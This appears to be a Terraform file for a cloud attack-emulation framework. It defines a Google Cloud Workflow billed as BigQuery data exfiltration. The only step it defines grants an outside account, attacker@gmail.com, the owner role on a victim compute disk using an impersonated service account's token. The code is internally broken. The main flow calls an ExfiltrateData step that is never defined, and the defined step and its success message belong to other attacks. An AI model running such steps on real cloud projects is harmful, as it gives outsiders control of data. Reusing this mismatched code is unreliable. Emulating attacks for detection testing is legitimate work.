data "google_service_account" "workflows-to-cloudrun-sa" {
  account_id   = "workflows-to-cloudrun-sa"

}


resource "google_workflows_workflow" "workflow_to_invoke_bq_data_exfiltration_via_job_attack" {
  name            = "gcp-bq-data-exfilration-via-job-toc"
  description     = "A workflow intended to execute Bigquery.T9 from the Trust On Cloud Threat Calalog for BigQuery, refer to: https://controlcatalog.trustoncloud.com/dashboard/gcp/bigquery#Threat%20Catalog?Bigquery.T9"
  service_account = data.google_service_account.workflows-to-cloudrun-sa.id
  project         = var.projectId
  source_contents = <<-EOF

######################################################################################
## Attack Description
######################################################################################
## This attack technique exfiltrates data from a Bigquery table through a SQL query executed
## via a Bigquery job.

#####################################################################################
## Input
######################################################################################
##### INPUT: {"sa":"01"}
##### INPUT: {"sa":"02"}


######################################################################################
## User Agent
######################################################################################
#### Excutes with User-Agent: "Derf-GCP-BQ-Data-Exfil-Via-Job-WORKFLOWEXECUTIONID"


######################################################################################
## Main Workflow Execution
######################################################################################
main:
  params: [args]
  steps:
    - assign:
        assign:
        - sa: $${args.sa}
        - projectID: $${sys.get_env("GOOGLE_CLOUD_PROJECT_ID")} 
    - ImpersonateDeRFAttackerServiceAccount:
        call: googleapis.workflowexecutions.v1.projects.locations.workflows.executions.run
        args:
          workflow_id: gcp-impersonate-derf-attack-sa
          location: us-central1
          project_id: $${projectID}
          argument: $${sa}
        result: AccessToken
    - ExfiltrateData:
        call: ExfiltrateData
        args:
            AccessToken: $${AccessToken}
        result: response
    - return:
        return: $${response}


######################################################################################
## Submodules | Sub-Workflows
######################################################################################

ShareComputeDisk:
  params: [AccessToken]
  steps:
    - ShareComputeDisk:
        try:
          call: http.post
          args:
            url: https://compute.googleapis.com/compute/v1/projects/${var.gcp_derf_project_id}/zones/us-central1-a/disks/derf-victim-disk/setIamPolicy?alt=json
            headers:
              authorization: '$${"Bearer "+AccessToken}' 
              Content-Type: application/json
              User-Agent: '$${"Derf-GCP-Share-Compute-Disk=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
            body: 
              policy:
                bindings:
                - members:
                  - user: attacker@gmail.com
                  role: roles/owner
                version: 3
          result: response
        except:
            as: e
            steps:
                - known_errors:
                    switch:
                    - condition: $${not("HttpError" in e.tags)}
                      return: "Connection problem."
                    - condition: $${e.code == 404}
                      return: "Sorry, URL wasn’t found."
                    - condition: $${e.code == 403}
                      return: "FAILURE | GCP Share Compute Disk - This is typically a permission error"
                    - condition: $${e.code == 200}
                      next: return
                - unhandled_exception0:
                    raise: $${e}

    - return:
        return: 
            - $${response.code}
            - "SUCCESS | GCP Impersonate Service Account Attack"


  EOF

}
